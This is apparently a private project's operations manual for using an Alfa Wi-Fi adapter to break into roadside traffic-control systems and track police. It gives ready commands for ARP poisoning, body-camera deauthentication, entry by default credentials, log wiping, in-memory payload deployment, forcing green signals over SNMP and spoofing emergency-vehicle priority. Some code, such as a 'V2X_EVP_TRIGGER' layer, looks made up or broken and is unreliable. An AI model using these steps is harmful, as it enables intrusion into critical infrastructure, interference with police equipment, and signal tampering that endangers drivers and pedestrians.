# ALFA CONTROL: Tactical Signal Infiltration Manual

| Field          | Value                                   |
|----------------|-----------------------------------------|
| Project        | Invincible.Inc / Omni Command Core      |
| Version        | 1.5.0                                   |
| Classification | T-LEVEL CLEARANCE ONLY                  |
| Hardware       | Alfa AWUS036ACH — RTL8812AU chipset     |

---

## CONTENTS

- [01 — Hardware Calibration](#01-hardware-calibration)
- [02 — Target Reconnaissance](#02-target-reconnaissance)
- [03 — The Parasite Hijack](#03-the-parasite-hijack)
- [04 — Volatile Infiltration (A9 Payload)](#04-volatile-infiltration-a9-payload)
- [05 — Grid Commissioning](#05-grid-commissioning)
- [06 — Tactical Signal Manipulation (Clear Path)](#06-tactical-signal-manipulation-clear-path)

---

## 01. HARDWARE CALIBRATION

The Alfa adapter is your kinetic bridge. Before infiltration, the hardware must be placed in **Monitor Mode** to break standard driver restrictions.

---

### PREREQUISITE — DSRC Unlock (one-time, run once per fresh driver clone)

The RTL8812AU driver ships with a hard channel-plan ceiling at Ch 177 (5.885 GHz) and does not register Ch 172 (5.860 GHz DSRC) with the kernel. The 9-patch unlock script corrects both layers:

```bash
# Inside Kali (root) — only needed once per driver source tree
bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_patch-alfa-dsrc.sh
```

**What it patches:**

| # | File | Change |
|---|------|--------|
| 1 | `core/rtw_rf.c` | `rtw_ch2freq()` cap extended ch177 → ch196 |
| 2 | `core/rtw_chplan.c` | RTW_RD_5G_FCC1 extended with DSRC ch170–184 |
| 3 | `core/rtw_chplan.c` | RTW_ChannelPlanMap[0x00] → RTW_RD_5G_FCC1 |
| 4 | `Makefile` | `CONFIG_RTW_CHPLAN = 0x00` (FCC compile default) |
| 5 | `/etc/modprobe.d/88xxau-omni.conf` | `rtw_channel_plan=0` at every load |
| 6 | `os_dep/linux/ioctl_cfg80211.c` | `CHAN5G(172,0)` added to `rtw_5ghz_a_channels[]` |
| 7 | `include/rtw_rf.h` | `CENTER_CH_5G_20M_NUM` 44 → 45 |
| 8 | `core/rtw_rf.c` | ch172 added to `center_ch_5g_20m[]` |
| 9 | `os_dep/linux/wifi_regd.c` | Regulatory band extended 5850 → 5925 MHz |

After the script completes it runs `make clean && make -j$(nproc)` automatically. Then proceed with PATH A or B below.

---

### PATH A — Windows (Recommended)

Run from an **admin PowerShell** terminal:

```powershell
cd C:\Users\eckel\Documents\Invincible.Inc\Omni-repo
.\scripts\Start-Alfa.ps1
```

Loads cfg80211 + 88XXau, attaches USB via usbipd, sets `wlan0` to monitor mode in one pass. Done — skip to section 02.

---

### PATH B — Kali Direct (root terminal)

**Step 1 — Load modules:**

```bash
bash /mnt/c/Users/eckel/Documents/Invincible.Inc/Omni-repo/scripts/_reload-alfa-driver.sh
```

**Step 2 — Confirm adapter is visible:**

```bash
iw dev
```

**Step 3 — Kill interfering processes:**

```bash
airmon-ng check kill
```

**Step 4 — Set monitor mode:**

```bash
airmon-ng start wlan0
```

> RTL8812AU fullmac driver does **NOT** rename the interface to `wlan0mon`.
> Interface stays as `wlan0`. Use `wlan0` in all subsequent commands.

**Step 5 — Verify chipset state:**

```bash
iwconfig wlan0
```

**Expected output:**

```
wlan0   IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

---

## 02. TARGET RECONNAISSANCE

Identify high-value roadside infrastructure by sniffing for Industrial/ITS (Intelligent Transportation Systems) signatures.

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**Target Signatures:**

| Type          | Pattern                                              | Vendor           |
|---------------|------------------------------------------------------|------------------|
| SSID          | `mndot-field-*`                                      | MnDOT field unit |
| SSID          | `ITS-RTMC`                                           | Traffic Mgmt Ctr |
| SSID          | `TRAFFIC_CTRL_*`                                     | Generic ITS      |
| OUI (MAC)     | `00:30:44`                                           | Cradlepoint      |
| OUI (MAC)     | `00:25:df`                                           | McCain           |
| OUI (MAC)     | `a0:f8:49`                                           | Iteris           |

---

**Targeted scan — filter by SSID regex:**

```bash
airodump-ng wlan0 --essid-regex "mndot|its-|traffic|sign-"
```

---

## 2.5. LEO / PATROL DETECTION (MOBILE RECON)

Detecting Law Enforcement Agency (LEA) assets in transit. Police vehicles utilize ruggedized gateways (Cradlepoint/Sierra) and Body Worn Cameras (Axon).

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**Target Signatures:**

| Device Type     | SSID Pattern / OUI                                  | Details             |
|-----------------|-----------------------------------------------------|---------------------|
| Patrol Vehicle  | `FORD_SYNC_POLICE`, `MDT-*`, `Patrol-*`             | Ford Interceptor    |
| Body Cam        | `AXON_CAM_*`, `BWC_*`, `00:25:31` (OUI)             | Axon Body 3         |
| Fleet Gateway   | `FirstNet`, `Frontline`, `00:30:44` (OUI)           | Cradlepoint/Sierra  |

**Command — Targeted Recon (Kali):**
```bash
sudo airodump-ng wlan0 --essid-regex "Police|Sheriff|Trooper|MDT|AXON|Ford|Cradlepoint|Sierra|FirstNet|Frontline|DPS"
```

**Command — Background Watcher (PowerShell):**
```powershell
while($true) { netsh wlan show networks mode=bssid | Select-String "Police","Sheriff","MDT","AXON","Ford","Cradlepoint","FirstNet" -Context 1,5; sleep 5 }
```

---

## 2.6. AXON "WHISPERPAIR" INTERDICTION

Axon Body 3 cameras use BLE and Wi-Fi for pairing. You can force identification and state changes.

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**A. Identify Axon BLE Emitter:**
Axon devices broadcast with Company ID `0x0344`. Look for Service UUID `00004953-0000-1000-8000-00805F9B34FB`.

**B. "Smart-Override" (Identify/Blink):**
Trigger the camera's "Find My" or pairing feedback to force LED blinking and high-power Wi-Fi broadcasting.

```bash
# Force Axon high-power broadcast (Pairing Mode Emulation)
python3 -c "from scapy.all import *; sendp(RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff')/Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info='AXON_WHISPER_PAIR'), iface='wlan0', loop=1, inter=0.1)"
```

**C. Forced De-authentication:**
Disconnect the BWC from the vehicle's MDT to force it into "Search/Pair" mode (which increases its RF footprint).
```bash
sudo aireplay-ng -0 5 -a <Vehicle_BSSID> -c <Camera_MAC> wlan0
```

---

**Broader scan — all channels, write full pcap:**

```bash
airodump-ng wlan0 --output-format pcap -w /tmp/recon_$(date +%s)
```

> Run these from a Kali bash terminal. If calling via PowerShell, use a script file —
> PowerShell expands `$()` before bash sees it.

---

## 03. THE "PARASITE" HIJACK

Use ARP Infrastructure Hijacking to redirect device traffic. This allows the Lattice to intercept NTCIP control packets.

**Step 1 — Prepare the Interface:**

```bash
# Set monitor mode and bring interface up
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**Step 2 — Identify target IP and gateway IP:**

Run a targeted scan to identify active ITS clients and their associated IPs.

```bash
# Targeted scan for ITS signatures
sudo airodump-ng wlan0 --essid-regex "mndot|its-|traffic|sign-"
```

**Step 3 — Execute the poisoning loop:**

| Variable      | Description                          |
|---------------|--------------------------------------|
| `target_ip`   | Roadside cabinet controller IP       |
| `gateway_ip`  | Industrial router / uplink gateway   |

```python
from scapy.all import *

def poison(target_ip, gateway_ip):
    # Op=2 (Is-at), Broadcast destination, Impersonate Gateway
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
    send(packet, verbose=False, loop=1, inter=2)
```

---

## 04. VOLATILE INFILTRATION (A9 PAYLOAD)

Deploying the **A9_PARASITE** RAM sniffer. Ghost-compliant: no persistent writes to disk.

**Entry vectors (choose one):**

| Vector        | Method                                     |
|---------------|--------------------------------------------|
| Primary       | Unauthenticated SNMP-SET (NTCIP 1206)      |
| Fallback      | Default SSH credentials                    |

**Step 1 — Gain entry** via one of the vectors above.

**Step 2 — Execute the Volatile Stream:**

```bash
# Scrub history and logs instantly
unset HISTFILE && export HISTSIZE=0 && rm -rf /var/log/messages

# Deploy polymorphic RAM payload
echo "<base64_blob>" | base64 -d > /tmp/.lattice_node
chmod +x /tmp/.lattice_node
/tmp/.lattice_node &    # Background execution
rm /tmp/.lattice_node   # Delete disk footprint
```

---

## 05. GRID COMMISSIONING

Finalize the hire by registering the node in the **Vanguard Dashboard**.

**Inputs required:**

| Field            | Value                          |
|------------------|--------------------------------|
| `node_id`        | Unique identifier for the node |
| `ip_address`     | Captured controller IP         |
| `lat` / `lon`    | Physical GPS coordinates       |
| `architecture`   | e.g. `armv7`, `x86_64`        |
| `infection_ts_ms`| Unix timestamp in milliseconds |

**Register the node:**

```sql
INSERT OR REPLACE INTO a9_ghost_nodes (node_id, ip_address, lat, lon, architecture, infection_ts_ms)
VALUES ('GHOST-NODE-ALPHA', '<ip>', 44.8547, -93.4708, 'armv7', 1716380000000);
```

---

## 06. TACTICAL SIGNAL MANIPULATION (CLEAR PATH)

Direct manipulation of traffic signals using the Alfa adapter to force green phases and create green waves.

---

### A. NTCIP 1209 Override (Cabinet Network)

Direct manipulation of traffic signals using the Alfa adapter to force green phases and create green waves.

**Step 1 — Connect to Cabinet Network:**

```bash
# Set to managed mode
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up

# Scan for available cabinet networks
sudo iw dev wlan0 scan | grep SSID

# Connect to target SSID (replace <SSID> and <Password>)
# Note: Use wpa_supplicant or nmcli if security is enabled
sudo iw dev wlan0 connect <SSID>
```

**Step 2 — Issue SNMP-SET Override:**

Once connected, issue an SNMP-SET to the controller MIB.

**Inputs required:**

| Variable     | Description                           | Example          |
|--------------|---------------------------------------|------------------|
| `target_ip`  | Controller IP on cabinet network      | `192.168.1.2`    |
| OID          | NTCIP 1209 Phase Control              | `1.3.6.1.4.1.1206.4.2.3.9.8.1` |

**Force Green Phase (60s) on Primary Lane:**

```bash
snmpset -v2c -c public <target_ip> 1.3.6.1.4.1.1206.4.2.3.9.8.1 s "; force_green=1"
```

---

### B. DSRC / OCB Mode Emulation (5.8 GHz)

The Alfa adapter emulates an Emergency Vehicle Priority (EVP) emitter targeting modern intersections.

**Note on OCB Mode:** `iw dev wlan0 set type ocb` currently returns "Operation not supported (-95)"
on this driver build — the RTL8812AU's cfg80211 ops table does not expose the OCB interface type.
**Monitor Mode is the active method** for both passive capture and raw frame injection on ch172.
Full OCB (802.11p peer mode) would require additional nl80211 capability flags in the driver's
wiphy registration; this is a known future patch target.

**Step 1 — Prepare the Interface:**

> **Requires the 9-patch DSRC unlock** (see Section 01 prerequisite). Ch 172 is registered
> directly in the driver's cfg80211 channel table and regulatory domain — no country-code
> workarounds needed. `iw reg set BO` is obsolete and has no effect with this driver build.

```bash
# Drop to managed, set monitor, bring up
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Tune to DSRC control channel — Ch 172 / 5.860 GHz
sudo iw dev wlan0 set channel 172

# Verify
iw dev wlan0 info
# Expected: channel 172 (5860 MHz), width: 20 MHz, center1: 5860 MHz
```

**Step 2 — Passive BSM Capture (Monitor Mode):**

With ch172 in monitor mode the adapter receives all V2X Basic Safety Messages (BSMs) and
WAVE Short Messages (WSMs) broadcast by equipped vehicles and RSUs in the vicinity.

```bash
# Capture all frames on ch172 to pcap for offline analysis
sudo tcpdump -i wlan0 -w /tmp/dsrc_$(date +%s).pcap

# Or pipe live through tshark for real-time decode
sudo tshark -i wlan0 -l
```

**Step 3 — Inject Priority Request (EVP Trigger):**

```bash
sudo python3 -c "from scapy.all import *; sendp(RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff')/V2X_EVP_TRIGGER(), iface='wlan0', loop=1, inter=0.1)"
```

> Mimics an Opticom/GTT 5.8 GHz DSRC broadcast using raw frame injection.

---

## MISSION STATUS: CORRIDOR DOMINANCE

Once commissioned, the device is a **Mesh Intelligence Node**. It passively exfiltrates LEA MAC sightings and V2X Basic Safety Messages (BSMs) to your Arion HUD — absolute situational dominance.

**Invincible.Inc: Technical Supremacy via Kinetic Logic.**
